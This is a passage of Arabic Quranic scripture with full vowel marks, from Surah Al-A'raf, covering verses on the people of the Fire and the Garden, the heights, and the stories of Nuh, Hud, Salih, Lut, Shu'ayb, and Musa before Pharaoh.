وَالَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا وَاسْتَكْبَرُوْا عَنْهَآ اُولٰۤىِٕكَ اَصْحٰبُ النَّارِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
فَمَنْ اَظْلَمُ مِمَّنِ افْتَرٰى عَلَى اللّٰهِ كَذِبًا اَوْ كَذَّبَ بِاٰيٰتِهٖ ۗ اُولٰۤىِٕكَ يَنَالُهُمْ نَصِيْبُهُمْ مِّنَ الْكِتٰبِ ۗ حَتّٰىٓ اِذَا جَاۤءَتْهُمْ رُسُلُنَا يَتَوَفَّوْنَهُمْ ۙ قَالُوْٓا اَيْنَ مَا كُنْتُمْ تَدْعُوْنَ مِنْ دُوْنِ اللّٰهِ ۗ قَالُوْا ضَلُّوْا عَنَّا وَشَهِدُوْا عَلٰٓى اَنْفُسِهِمْ اَنَّهُمْ كَانُوْا كٰفِرِيْنَ
قَالَ ادْخُلُوْا فِيْٓ اُمَمٍ قَدْ خَلَتْ مِنْ قَبْلِكُمْ مِّنَ الْجِنِّ وَالْاِنْسِ فِى النَّارِ ۗ كُلَّمَا دَخَلَتْ اُمَّةٌ لَّعَنَتْ اُخْتَهَا ۗ حَتّٰىٓ اِذَا ادّٰرَكُوْا فِيْهَا جَمِيْعًا ۙ قَالَتْ اُخْرٰىهُمْ لِاُوْلٰىهُمْ رَبَّنَا هٰٓؤُلَاۤءِ اَضَلُّوْنَا فَاٰتِهِمْ عَذَابًا ضِعْفًا مِّنَ النَّارِ ۗ قَالَ لِكُلٍّ ضِعْفٌ وَّلٰكِنْ لَّا تَعْلَمُوْنَ
وَقَالَتْ اُوْلٰىهُمْ لِاُخْرٰىهُمْ فَمَا كَانَ لَكُمْ عَلَيْنَا مِنْ فَضْلٍ فَذُوْقُوا الْعَذَابَ بِمَا كُنْتُمْ تَكْسِبُوْنَ
اِنَّ الَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا وَاسْتَكْبَرُوْا عَنْهَا لَا تُفَتَّحُ لَهُمْ اَبْوَابُ السَّمَاۤءِ وَلَا يَدْخُلُوْنَ الْجَنَّةَ حَتّٰى يَلِجَ الْجَمَلُ فِيْ سَمِّ الْخِيَاطِ ۗ وَكَذٰلِكَ نَجْزِى الْمُجْرِمِيْنَ
لَهُمْ مِّنْ جَهَنَّمَ مِهَادٌ وَّمِنْ فَوْقِهِمْ غَوَاشٍ ۗ وَكَذٰلِكَ نَجْزِى الظّٰلِمِيْنَ
وَالَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ لَا نُكَلِّفُ نَفْسًا اِلَّا وُسْعَهَا ۗ اُولٰۤىِٕكَ اَصْحٰبُ الْجَنَّةِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
وَنَزَعْنَا مَا فِيْ صُدُوْرِهِمْ مِّنْ غِلٍّ تَجْرِيْ مِنْ تَحْتِهِمُ الْاَنْهٰرُ ۚ وَقَالُوا الْحَمْدُ لِلّٰهِ الَّذِيْ هَدٰىنَا لِهٰذَا ۗ وَمَا كُنَّا لِنَهْتَدِيَ لَوْلَآ اَنْ هَدٰىنَا اللّٰهُ ۚ لَقَدْ جَاۤءَتْ رُسُلُ رَبِّنَا بِالْحَقِّ ۗ وَنُوْدُوْٓا اَنْ تِلْكُمُ الْجَنَّةُ اُوْرِثْتُمُوْهَا بِمَا كُنْتُمْ تَعْمَلُوْنَ
وَنَادٰىٓ اَصْحٰبُ الْجَنَّةِ اَصْحٰبَ النَّارِ اَنْ قَدْ وَجَدْنَا مَا وَعَدَنَا رَبُّنَا حَقًّا فَهَلْ وَجَدْتُّمْ مَّا وَعَدَ رَبُّكُمْ حَقًّا ۗ قَالُوْا نَعَمْ ۚ فَاَذَّنَ مُؤَذِّنٌۢ بَيْنَهُمْ اَنْ لَّعْنَةُ اللّٰهِ عَلَى الظّٰلِمِيْنَ
الَّذِيْنَ يَصُدُّوْنَ عَنْ سَبِيْلِ اللّٰهِ وَيَبْغُوْنَهَا عِوَجًا ۚ وَهُمْ بِالْاٰخِرَةِ كٰفِرُوْنَ
وَبَيْنَهُمَا حِجَابٌ ۚ وَعَلَى الْاَعْرَافِ رِجَالٌ يَّعْرِفُوْنَ كُلًّا بِسِيْمٰىهُمْ ۚ وَنَادَوْا اَصْحٰبَ الْجَنَّةِ اَنْ سَلٰمٌ عَلَيْكُمْ ۗ لَمْ يَدْخُلُوْهَا وَهُمْ يَطْمَعُوْنَ
وَاِذَا صُرِفَتْ اَبْصَارُهُمْ تِلْقَاۤءَ اَصْحٰبِ النَّارِ قَالُوْا رَبَّنَا لَا تَجْعَلْنَا مَعَ الْقَوْمِ الظّٰلِمِيْنَ
وَنَادٰىٓ اَصْحٰبُ الْاَعْرَافِ رِجَالًا يَّعْرِفُوْنَهُمْ بِسِيْمٰىهُمْ قَالُوْا مَآ اَغْنٰى عَنْكُمْ جَمْعُكُمْ وَمَا كُنْتُمْ تَسْتَكْبِرُوْنَ
اَهٰٓؤُلَاۤءِ الَّذِيْنَ اَقْسَمْتُمْ لَا يَنَالُهُمُ اللّٰهُ بِرَحْمَةٍ ۗ اُدْخُلُوا الْجَنَّةَ لَا خَوْفٌ عَلَيْكُمْ وَلَا اَنْتُمْ تَحْزَنُوْنَ
وَنَادٰىٓ اَصْحٰبُ النَّارِ اَصْحٰبَ الْجَنَّةِ اَنْ اَفِيْضُوْا عَلَيْنَا مِنَ الْمَاۤءِ اَوْ مِمَّا رَزَقَكُمُ اللّٰهُ ۗ قَالُوْٓا اِنَّ اللّٰهَ حَرَّمَهُمَا عَلَى الْكٰفِرِيْنَ
الَّذِيْنَ اتَّخَذُوْا دِيْنَهُمْ لَهْوًا وَّلَعِبًا وَّغَرَّتْهُمُ الْحَيٰوةُ الدُّنْيَا ۚ فَالْيَوْمَ نَنْسٰىهُمْ كَمَا نَسُوْا لِقَاۤءَ يَوْمِهِمْ هٰذَا ۙ وَمَا كَانُوْا بِاٰيٰتِنَا يَجْحَدُوْنَ
وَلَقَدْ جِئْنٰهُمْ بِكِتٰبٍ فَصَّلْنٰهُ عَلٰى عِلْمٍ هُدًى وَّرَحْمَةً لِّقَوْمٍ يُّؤْمِنُوْنَ
هَلْ يَنْظُرُوْنَ اِلَّا تَأْوِيْلَهٗ ۗ يَوْمَ يَأْتِيْ تَأْوِيْلُهٗ يَقُوْلُ الَّذِيْنَ نَسُوْهُ مِنْ قَبْلُ قَدْ جَاۤءَتْ رُسُلُ رَبِّنَا بِالْحَقِّۚ فَهَلْ لَّنَا مِنْ شُفَعَاۤءَ فَيَشْفَعُوْا لَنَآ اَوْ نُرَدُّ فَنَعْمَلَ غَيْرَ الَّذِيْ كُنَّا نَعْمَلُ ۗ قَدْ خَسِرُوْٓا اَنْفُسَهُمْ وَضَلَّ عَنْهُمْ مَّا كَانُوْا يَفْتَرُوْنَ
اِنَّ رَبَّكُمُ اللّٰهُ الَّذِيْ خَلَقَ السَّمٰوٰتِ وَالْاَرْضَ فِيْ سِتَّةِ اَيَّامٍ ثُمَّ اسْتَوٰى عَلَى الْعَرْشِ ۗ يُغْشِى الَّيْلَ النَّهَارَ يَطْلُبُهٗ حَثِيْثًا ۙ وَّالشَّمْسَ وَالْقَمَرَ وَالنُّجُوْمَ مُسَخَّرٰتٍۢ بِاَمْرِهٖ ۗ اَلَا لَهُ الْخَلْقُ وَالْاَمْرُ ۗ تَبٰرَكَ اللّٰهُ رَبُّ الْعٰلَمِيْنَ
اُدْعُوْا رَبَّكُمْ تَضَرُّعًا وَّخُفْيَةً ۗ اِنَّهٗ لَا يُحِبُّ الْمُعْتَدِيْنَ
وَلَا تُفْسِدُوْا فِى الْاَرْضِ بَعْدَ اِصْلَاحِهَا وَادْعُوْهُ خَوْفًا وَّطَمَعًا ۗ اِنَّ رَحْمَتَ اللّٰهِ قَرِيْبٌ مِّنَ الْمُحْسِنِيْنَ
وَهُوَ الَّذِيْ يُرْسِلُ الرِّيٰحَ بُشْرًاۢ بَيْنَ يَدَيْ رَحْمَتِهٖ ۗ حَتّٰىٓ اِذَآ اَقَلَّتْ سَحَابًا ثِقَالًا سُقْنٰهُ لِبَلَدٍ مَّيِّتٍ فَاَنْزَلْنَا بِهِ الْمَاۤءَ فَاَخْرَجْنَا بِهٖ مِنْ كُلِّ الثَّمَرٰتِ ۗ كَذٰلِكَ نُخْرِجُ الْمَوْتٰى لَعَلَّكُمْ تَذَكَّرُوْنَ
وَالْبَلَدُ الطَّيِّبُ يَخْرُجُ نَبَاتُهٗ بِاِذْنِ رَبِّهٖ ۚ وَالَّذِيْ خَبُثَ لَا يَخْرُجُ اِلَّا نَكِدًا ۗ كَذٰلِكَ نُصَرِّفُ الْاٰيٰتِ لِقَوْمٍ يَّشْكُرُوْنَ
لَقَدْ اَرْسَلْنَا نُوْحًا اِلٰى قَوْمِهٖ فَقَالَ يٰقَوْمِ اعْبُدُوا اللّٰهَ مَا لَكُمْ مِّنْ اِلٰهٍ غَيْرُهٗ ۗ اِنِّيْٓ اَخَافُ عَلَيْكُمْ عَذَابَ يَوْمٍ عَظِيْمٍ
قَالَ الْمَلَاُ مِنْ قَوْمِهٖٓ اِنَّا لَنَرٰىكَ فِيْ ضَلٰلٍ مُّبِيْنٍ
قَالَ يٰقَوْمِ لَيْسَ بِيْ ضَلٰلَةٌ وَّلٰكِنِّيْ رَسُوْلٌ مِّنْ رَّبِّ الْعٰلَمِيْنَ
اُبَلِّغُكُمْ رِسٰلٰتِ رَبِّيْ وَاَنْصَحُ لَكُمْ وَاَعْلَمُ مِنَ اللّٰهِ مَا لَا تَعْلَمُوْنَ
اَوَعَجِبْتُمْ اَنْ جَاۤءَكُمْ ذِكْرٌ مِّنْ رَّبِّكُمْ عَلٰى رَجُلٍ مِّنْكُمْ لِيُنْذِرَكُمْ وَلِتَتَّقُوْا وَلَعَلَّكُمْ تُرْحَمُوْنَ
فَكَذَّبُوْهُ فَاَنْجَيْنٰهُ وَالَّذِيْنَ مَعَهٗ فِى الْفُلْكِ وَاَغْرَقْنَا الَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا ۗ اِنَّهُمْ كَانُوْا قَوْمًا عَمِيْنَ
وَاِلٰى عَادٍ اَخَاهُمْ هُوْدًا ۗ قَالَ يٰقَوْمِ اعْبُدُوا اللّٰهَ مَا لَكُمْ مِّنْ اِلٰهٍ غَيْرُهٗ ۗ اَفَلَا تَتَّقُوْنَ
قَالَ الْمَلَاُ الَّذِيْنَ كَفَرُوْا مِنْ قَوْمِهٖٓ اِنَّا لَنَرٰىكَ فِيْ سَفَاهَةٍ وَّاِنَّا لَنَظُنُّكَ مِنَ الْكٰذِبِيْنَ
قَالَ يٰقَوْمِ لَيْسَ بِيْ سَفَاهَةٌ وَّلٰكِنِّيْ رَسُوْلٌ مِّنْ رَّبِّ الْعٰلَمِيْنَ
اُبَلِّغُكُمْ رِسٰلٰتِ رَبِّيْ وَاَنَا۠ لَكُمْ نَاصِحٌ اَمِيْنٌ
اَوَعَجِبْتُمْ اَنْ جَاۤءَكُمْ ذِكْرٌ مِّنْ رَّبِّكُمْ عَلٰى رَجُلٍ مِّنْكُمْ لِيُنْذِرَكُمْ ۗ وَاذْكُرُوْٓا اِذْ جَعَلَكُمْ خُلَفَاۤءَ مِنْۢ بَعْدِ قَوْمِ نُوْحٍ وَّزَادَكُمْ فِى الْخَلْقِ بَسْطَةً ۖ فَاذْكُرُوْٓا اٰلَاۤءَ اللّٰهِ لَعَلَّكُمْ تُفْلِحُوْنَ
قَالُوْٓا اَجِئْتَنَا لِنَعْبُدَ اللّٰهَ وَحْدَهٗ وَنَذَرَ مَا كَانَ يَعْبُدُ اٰبَاۤؤُنَا ۚ فَأْتِنَا بِمَا تَعِدُنَآ اِنْ كُنْتَ مِنَ الصّٰدِقِيْنَ
قَالَ قَدْ وَقَعَ عَلَيْكُمْ مِّنْ رَّبِّكُمْ رِجْسٌ وَّغَضَبٌ ۗ اَتُجَادِلُوْنَنِيْ فِيْٓ اَسْمَاۤءٍ سَمَّيْتُمُوْهَآ اَنْتُمْ وَاٰبَاۤؤُكُمْ مَّا نَزَّلَ اللّٰهُ بِهَا مِنْ سُلْطٰنٍ ۚ فَانْتَظِرُوْٓا اِنِّيْ مَعَكُمْ مِّنَ الْمُنْتَظِرِيْنَ
فَاَنْجَيْنٰهُ وَالَّذِيْنَ مَعَهٗ بِرَحْمَةٍ مِّنَّا وَقَطَعْنَا دَابِرَ الَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا ۚ وَمَا كَانُوْا مُؤْمِنِيْنَ
وَاِلٰى ثَمُوْدَ اَخَاهُمْ صٰلِحًا ۘ قَالَ يٰقَوْمِ اعْبُدُوا اللّٰهَ مَا لَكُمْ مِّنْ اِلٰهٍ غَيْرُهٗ ۗ قَدْ جَاۤءَتْكُمْ بَيِّنَةٌ مِّنْ رَّبِّكُمْ ۗ هٰذِهٖ نَاقَةُ اللّٰهِ لَكُمْ اٰيَةً فَذَرُوْهَا تَأْكُلْ فِيْٓ اَرْضِ اللّٰهِ ۖ وَلَا تَمَسُّوْهَا بِسُوْۤءٍ فَيَأْخُذَكُمْ عَذَابٌ اَلِيْمٌ
وَاذْكُرُوْٓا اِذْ جَعَلَكُمْ خُلَفَاۤءَ مِنْۢ بَعْدِ عَادٍ وَّبَوَّاَكُمْ فِى الْاَرْضِ تَتَّخِذُوْنَ مِنْ سُهُوْلِهَا قُصُوْرًا وَّتَنْحِتُوْنَ الْجِبَالَ بُيُوْتًا ۚ فَاذْكُرُوْٓا اٰلَاۤءَ اللّٰهِ وَلَا تَعْثَوْا فِى الْاَرْضِ مُفْسِدِيْنَ
قَالَ الْمَلَاُ الَّذِيْنَ اسْتَكْبَرُوْا مِنْ قَوْمِهٖ لِلَّذِيْنَ اسْتُضْعِفُوْا لِمَنْ اٰمَنَ مِنْهُمْ اَتَعْلَمُوْنَ اَنَّ صٰلِحًا مُّرْسَلٌ مِّنْ رَّبِّهٖ ۗ قَالُوْٓا اِنَّا بِمَآ اُرْسِلَ بِهٖ مُؤْمِنُوْنَ
قَالَ الَّذِيْنَ اسْتَكْبَرُوْٓا اِنَّا بِالَّذِيْٓ اٰمَنْتُمْ بِهٖ كٰفِرُوْنَ
فَعَقَرُوا النَّاقَةَ وَعَتَوْا عَنْ اَمْرِ رَبِّهِمْ وَقَالُوْا يٰصٰلِحُ ائْتِنَا بِمَا تَعِدُنَآ اِنْ كُنْتَ مِنَ الْمُرْسَلِيْنَ
فَاَخَذَتْهُمُ الرَّجْفَةُ فَاَصْبَحُوْا فِيْ دَارِهِمْ جٰثِمِيْنَ
فَتَوَلّٰى عَنْهُمْ وَقَالَ يٰقَوْمِ لَقَدْ اَبْلَغْتُكُمْ رِسَالَةَ رَبِّيْ وَنَصَحْتُ لَكُمْ وَلٰكِنْ لَّا تُحِبُّوْنَ النّٰصِحِيْنَ
وَلُوْطًا اِذْ قَالَ لِقَوْمِهٖٓ اَتَأْتُوْنَ الْفَاحِشَةَ مَا سَبَقَكُمْ بِهَا مِنْ اَحَدٍ مِّنَ الْعٰلَمِيْنَ
اِنَّكُمْ لَتَأْتُوْنَ الرِّجَالَ شَهْوَةً مِّنْ دُوْنِ النِّسَاۤءِ ۗ بَلْ اَنْتُمْ قَوْمٌ مُّسْرِفُوْنَ
وَمَا كَانَ جَوَابَ قَوْمِهٖٓ اِلَّآ اَنْ قَالُوْٓا اَخْرِجُوْهُمْ مِّنْ قَرْيَتِكُمْ ۚ اِنَّهُمْ اُنَاسٌ يَّتَطَهَّرُوْنَ
فَاَنْجَيْنٰهُ وَاَهْلَهٗٓ اِلَّا امْرَاَتَهٗ ۖ كَانَتْ مِنَ الْغٰبِرِيْنَ
وَاَمْطَرْنَا عَلَيْهِمْ مَّطَرًا ۚ فَانْظُرْ كَيْفَ كَانَ عَاقِبَةُ الْمُجْرِمِيْنَ
وَاِلٰى مَدْيَنَ اَخَاهُمْ شُعَيْبًا ۗ قَالَ يٰقَوْمِ اعْبُدُوا اللّٰهَ مَا لَكُمْ مِّنْ اِلٰهٍ غَيْرُهٗ ۗ قَدْ جَاۤءَتْكُمْ بَيِّنَةٌ مِّنْ رَّبِّكُمْ فَاَوْفُوا الْكَيْلَ وَالْمِيْزَانَ وَلَا تَبْخَسُوا النَّاسَ اَشْيَاۤءَهُمْ وَلَا تُفْسِدُوْا فِى الْاَرْضِ بَعْدَ اِصْلَاحِهَا ۗ ذٰلِكُمْ خَيْرٌ لَّكُمْ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
وَلَا تَقْعُدُوْا بِكُلِّ صِرَاطٍ تُوْعِدُوْنَ وَتَصُدُّوْنَ عَنْ سَبِيْلِ اللّٰهِ مَنْ اٰمَنَ بِهٖ وَتَبْغُوْنَهَا عِوَجًا ۚ وَاذْكُرُوْٓا اِذْ كُنْتُمْ قَلِيْلًا فَكَثَّرَكُمْ ۖ وَانْظُرُوْا كَيْفَ كَانَ عَاقِبَةُ الْمُفْسِدِيْنَ
وَاِنْ كَانَ طَاۤىِٕفَةٌ مِّنْكُمْ اٰمَنُوْا بِالَّذِيْٓ اُرْسِلْتُ بِهٖ وَطَاۤىِٕفَةٌ لَّمْ يُؤْمِنُوْا فَاصْبِرُوْا حَتّٰى يَحْكُمَ اللّٰهُ بَيْنَنَا ۚ وَهُوَ خَيْرُ الْحٰكِمِيْنَ
قَالَ الْمَلَاُ الَّذِيْنَ اسْتَكْبَرُوْا مِنْ قَوْمِهٖ لَنُخْرِجَنَّكَ يٰشُعَيْبُ وَالَّذِيْنَ اٰمَنُوْا مَعَكَ مِنْ قَرْيَتِنَآ اَوْ لَتَعُوْدُنَّ فِيْ مِلَّتِنَا ۗ قَالَ اَوَلَوْ كُنَّا كٰرِهِيْنَ
قَدِ افْتَرَيْنَا عَلَى اللّٰهِ كَذِبًا اِنْ عُدْنَا فِيْ مِلَّتِكُمْ بَعْدَ اِذْ نَجّٰىنَا اللّٰهُ مِنْهَا ۗ وَمَا يَكُوْنُ لَنَآ اَنْ نَّعُوْدَ فِيْهَآ اِلَّآ اَنْ يَّشَاۤءَ اللّٰهُ رَبُّنَا ۗ وَسِعَ رَبُّنَا كُلَّ شَيْءٍ عِلْمًا ۗ عَلَى اللّٰهِ تَوَكَّلْنَا ۗ رَبَّنَا افْتَحْ بَيْنَنَا وَبَيْنَ قَوْمِنَا بِالْحَقِّ وَاَنْتَ خَيْرُ الْفٰتِحِيْنَ
وَقَالَ الْمَلَاُ الَّذِيْنَ كَفَرُوْا مِنْ قَوْمِهٖ لَىِٕنِ اتَّبَعْتُمْ شُعَيْبًا اِنَّكُمْ اِذًا لَّخٰسِرُوْنَ
فَاَخَذَتْهُمُ الرَّجْفَةُ فَاَصْبَحُوْا فِيْ دَارِهِمْ جٰثِمِيْنَ
اَلَّذِيْنَ كَذَّبُوْا شُعَيْبًا كَاَنْ لَّمْ يَغْنَوْا فِيْهَا ۛۚ اَلَّذِيْنَ كَذَّبُوْا شُعَيْبًا كَانُوْا هُمُ الْخٰسِرِيْنَ
فَتَوَلّٰى عَنْهُمْ وَقَالَ يٰقَوْمِ لَقَدْ اَبْلَغْتُكُمْ رِسٰلٰتِ رَبِّيْ وَنَصَحْتُ لَكُمْ ۚ فَكَيْفَ اٰسٰى عَلٰى قَوْمٍ كٰفِرِيْنَ
وَمَآ اَرْسَلْنَا فِيْ قَرْيَةٍ مِّنْ نَّبِيٍّ اِلَّآ اَخَذْنَآ اَهْلَهَا بِالْبَأْسَاۤءِ وَالضَّرَّاۤءِ لَعَلَّهُمْ يَضَّرَّعُوْنَ
ثُمَّ بَدَّلْنَا مَكَانَ السَّيِّئَةِ الْحَسَنَةَ حَتّٰى عَفَوْا وَّقَالُوْا قَدْ مَسَّ اٰبَاۤءَنَا الضَّرَّاۤءُ وَالسَّرَّاۤءُ فَاَخَذْنٰهُمْ بَغْتَةً وَّهُمْ لَا يَشْعُرُوْنَ
وَلَوْ اَنَّ اَهْلَ الْقُرٰٓى اٰمَنُوْا وَاتَّقَوْا لَفَتَحْنَا عَلَيْهِمْ بَرَكٰتٍ مِّنَ السَّمَاۤءِ وَالْاَرْضِ وَلٰكِنْ كَذَّبُوْا فَاَخَذْنٰهُمْ بِمَا كَانُوْا يَكْسِبُوْنَ
اَفَاَمِنَ اَهْلُ الْقُرٰٓى اَنْ يَّأْتِيَهُمْ بَأْسُنَا بَيَاتًا وَّهُمْ نَاۤىِٕمُوْنَ
اَوَاَمِنَ اَهْلُ الْقُرٰٓى اَنْ يَّأْتِيَهُمْ بَأْسُنَا ضُحًى وَّهُمْ يَلْعَبُوْنَ
اَفَاَمِنُوْا مَكْرَ اللّٰهِ ۚ فَلَا يَأْمَنُ مَكْرَ اللّٰهِ اِلَّا الْقَوْمُ الْخٰسِرُوْنَ
اَوَلَمْ يَهْدِ لِلَّذِيْنَ يَرِثُوْنَ الْاَرْضَ مِنْۢ بَعْدِ اَهْلِهَآ اَنْ لَّوْ نَشَاۤءُ اَصَبْنٰهُمْ بِذُنُوْبِهِمْ ۚ وَنَطْبَعُ عَلٰى قُلُوْبِهِمْ فَهُمْ لَا يَسْمَعُوْنَ
تِلْكَ الْقُرٰى نَقُصُّ عَلَيْكَ مِنْ اَنْۢبَاۤىِٕهَا ۚ وَلَقَدْ جَاۤءَتْهُمْ رُسُلُهُمْ بِالْبَيِّنٰتِ ۚ فَمَا كَانُوْا لِيُؤْمِنُوْا بِمَا كَذَّبُوْا مِنْ قَبْلُ ۗ كَذٰلِكَ يَطْبَعُ اللّٰهُ عَلٰى قُلُوْبِ الْكٰفِرِيْنَ
وَمَا وَجَدْنَا لِاَكْثَرِهِمْ مِّنْ عَهْدٍ ۚ وَاِنْ وَّجَدْنَآ اَكْثَرَهُمْ لَفٰسِقِيْنَ
ثُمَّ بَعَثْنَا مِنْۢ بَعْدِهِمْ مُّوْسٰى بِاٰيٰتِنَآ اِلٰى فِرْعَوْنَ وَمَلَا۟ىِٕهٖ فَظَلَمُوْا بِهَا ۚ فَانْظُرْ كَيْفَ كَانَ عَاقِبَةُ الْمُفْسِدِيْنَ
وَقَالَ مُوْسٰى يٰفِرْعَوْنُ اِنِّيْ رَسُوْلٌ مِّنْ رَّبِّ الْعٰلَمِيْنَ
حَقِيْقٌ عَلٰٓى اَنْ لَّآ اَقُوْلَ عَلَى اللّٰهِ اِلَّا الْحَقَّ ۗ قَدْ جِئْتُكُمْ بِبَيِّنَةٍ مِّنْ رَّبِّكُمْ فَاَرْسِلْ مَعِيَ بَنِيْٓ اِسْرَاۤءِيْلَ
قَالَ اِنْ كُنْتَ جِئْتَ بِاٰيَةٍ فَأْتِ بِهَآ اِنْ كُنْتَ مِنَ الصّٰدِقِيْنَ
فَاَلْقٰى عَصَاهُ فَاِذَا هِيَ ثُعْبَانٌ مُّبِيْنٌ
وَّنَزَعَ يَدَهٗ فَاِذَا هِيَ بَيْضَاۤءُ لِلنّٰظِرِيْنَ
قَالَ الْمَلَاُ مِنْ قَوْمِ فِرْعَوْنَ اِنَّ هٰذَا لَسٰحِرٌ عَلِيْمٌ
يُّرِيْدُ اَنْ يُّخْرِجَكُمْ مِّنْ اَرْضِكُمْ ۚ فَمَاذَا تَأْمُرُوْنَ
قَالُوْٓا اَرْجِهْ وَاَخَاهُ وَاَرْسِلْ فِى الْمَدَاۤىِٕنِ حٰشِرِيْنَ
يَأْتُوْكَ بِكُلِّ سٰحِرٍ عَلِيْمٍ
وَجَاۤءَ السَّحَرَةُ فِرْعَوْنَ قَالُوْٓا اِنَّ لَنَا لَاَجْرًا اِنْ كُنَّا نَحْنُ الْغٰلِبِيْنَ
قَالَ نَعَمْ وَاِنَّكُمْ لَمِنَ الْمُقَرَّبِيْنَ
قَالُوْا يٰمُوْسٰىٓ اِمَّآ اَنْ تُلْقِيَ وَاِمَّآ اَنْ نَّكُوْنَ نَحْنُ الْمُلْقِيْنَ
قَالَ اَلْقُوْا ۚ فَلَمَّآ اَلْقَوْا سَحَرُوْٓا اَعْيُنَ النَّاسِ وَاسْتَرْهَبُوْهُمْ وَجَاۤءُوْ بِسِحْرٍ عَظِيْمٍ
وَاَوْحَيْنَآ اِلٰى مُوْسٰىٓ اَنْ اَلْقِ عَصَاكَ ۚ فَاِذَا هِيَ تَلْقَفُ مَا يَأْفِكُوْنَ
فَوَقَعَ الْحَقُّ وَبَطَلَ مَا كَانُوْا يَعْمَلُوْنَ
فَغُلِبُوْا هُنَالِكَ وَانْقَلَبُوْا صٰغِرِيْنَ
وَاُلْقِيَ السَّحَرَةُ سٰجِدِيْنَ
قَالُوْٓا اٰمَنَّا بِرَبِّ الْعٰلَمِيْنَ
رَبِّ مُوْسٰى وَهٰرُوْنَ
قَالَ فِرْعَوْنُ اٰمَنْتُمْ بِهٖ قَبْلَ اَنْ اٰذَنَ لَكُمْ ۚ اِنَّ هٰذَا لَمَكْرٌ مَّكَرْتُمُوْهُ فِى الْمَدِيْنَةِ لِتُخْرِجُوْا مِنْهَآ اَهْلَهَا ۚ فَسَوْفَ تَعْلَمُوْنَ
لَاُقَطِّعَنَّ اَيْدِيَكُمْ وَاَرْجُلَكُمْ مِّنْ خِلَافٍ ثُمَّ لَاُصَلِّبَنَّكُمْ اَجْمَعِيْنَ
قَالُوْٓا اِنَّآ اِلٰى رَبِّنَا مُنْقَلِبُوْنَ
وَمَا تَنْقِمُ مِنَّآ اِلَّآ اَنْ اٰمَنَّا بِاٰيٰتِ رَبِّنَا لَمَّا جَاۤءَتْنَا ۗ رَبَّنَآ اَفْرِغْ عَلَيْنَا صَبْرًا وَّتَوَفَّنَا مُسْلِمِيْنَ
وَقَالَ الْمَلَاُ مِنْ قَوْمِ فِرْعَوْنَ اَتَذَرُ مُوْسٰى وَقَوْمَهٗ لِيُفْسِدُوْا فِى الْاَرْضِ وَيَذَرَكَ وَاٰلِهَتَكَ ۗ قَالَ سَنُقَتِّلُ اَبْنَاۤءَهُمْ وَنَسْتَحْيٖ نِسَاۤءَهُمْ ۚ وَاِنَّا فَوْقَهُمْ قٰهِرُوْنَ
قَالَ مُوْسٰى لِقَوْمِهِ اسْتَعِيْنُوْا بِاللّٰهِ وَاصْبِرُوْا ۚ اِنَّ الْاَرْضَ لِلّٰهِ ۚ يُوْرِثُهَا مَنْ يَّشَاۤءُ مِنْ عِبَادِهٖ ۚ وَالْعَاقِبَةُ لِلْمُتَّقِيْنَ
قَالُوْٓا اُوْذِيْنَا مِنْ قَبْلِ اَنْ تَأْتِيَنَا وَمِنْۢ بَعْدِ مَا جِئْتَنَا ۗ قَالَ عَسٰى رَبُّكُمْ اَنْ يُّهْلِكَ عَدُوَّكُمْ وَيَسْتَخْلِفَكُمْ فِى الْاَرْضِ فَيَنْظُرَ كَيْفَ تَعْمَلُوْنَ
وَلَقَدْ اَخَذْنَآ اٰلَ فِرْعَوْنَ بِالسِّنِيْنَ وَنَقْصٍ مِّنَ الثَّمَرٰتِ لَعَلَّهُمْ يَذَّكَّرُوْنَ
فَاِذَا جَاۤءَتْهُمُ الْحَسَنَةُ قَالُوْا لَنَا هٰذِهٖ ۚ وَاِنْ تُصِبْهُمْ سَيِّئَةٌ يَّطَّيَّرُوْا بِمُوْسٰى وَمَنْ مَّعَهٗ ۗ اَلَآ اِنَّمَا طٰۤىِٕرُهُمْ عِنْدَ اللّٰهِ وَلٰكِنَّ اَكْثَرَهُمْ لَا يَعْلَمُوْنَ
وَقَالُوْا مَهْمَا تَأْتِنَا بِهٖ مِنْ اٰيَةٍ لِّتَسْحَرَنَا بِهَا ۙ فَمَا نَحْنُ لَكَ بِمُؤْمِنِيْنَ
فَاَرْسَلْنَا عَلَيْهِمُ الطُّوْفَانَ وَالْجَرَادَ وَالْقُمَّلَ وَالضَّفَادِعَ وَالدَّمَ اٰيٰتٍ مُّفَصَّلٰتٍ فَاسْتَكْبَرُوْا وَكَانُوْا قَوْمًا مُّجْرِمِيْنَ
وَلَمَّا وَقَعَ عَلَيْهِمُ الرِّجْزُ قَالُوْا يٰمُوْسَى ادْعُ لَنَا رَبَّكَ بِمَا عَهِدَ عِنْدَكَ ۚ لَىِٕنْ كَشَفْتَ عَنَّا الرِّجْزَ لَنُؤْمِنَنَّ لَكَ وَلَنُرْسِلَنَّ مَعَكَ بَنِيْٓ اِسْرَاۤءِيْلَ
فَلَمَّا كَشَفْنَا عَنْهُمُ الرِّجْزَ اِلٰٓى اَجَلٍ هُمْ بٰلِغُوْهُ اِذَا هُمْ يَنْكُثُوْنَ
فَانْتَقَمْنَا مِنْهُمْ فَاَغْرَقْنٰهُمْ فِى الْيَمِّ بِاَنَّهُمْ كَذَّبُوْا بِاٰيٰتِنَا وَكَانُوْا عَنْهَا غٰفِلِيْنَ
وَاَوْرَثْنَا الْقَوْمَ الَّذِيْنَ كَانُوْا يُسْتَضْعَفُوْنَ مَشَارِقَ الْاَرْضِ وَمَغَارِبَهَا الَّتِيْ بٰرَكْنَا فِيْهَا ۗ وَتَمَّتْ كَلِمَتُ رَبِّكَ الْحُسْنٰى عَلٰى بَنِيْٓ اِسْرَاۤءِيْلَ بِمَا صَبَرُوْا ۗ وَدَمَّرْنَا مَا كَانَ يَصْنَعُ فِرْعَوْنُ وَقَوْمُهٗ وَمَا كَانُوْا يَعْرِشُوْنَ
